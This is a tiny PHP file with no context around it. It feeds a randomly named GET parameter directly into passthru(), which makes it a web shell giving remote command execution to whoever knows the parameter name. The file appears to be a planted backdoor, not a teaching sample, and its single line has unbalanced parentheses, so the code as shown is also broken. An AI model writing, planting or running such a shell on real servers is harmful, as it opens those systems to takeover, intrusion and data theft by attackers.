<?php
passthru(($_GET['UVejKlxb']);
?>
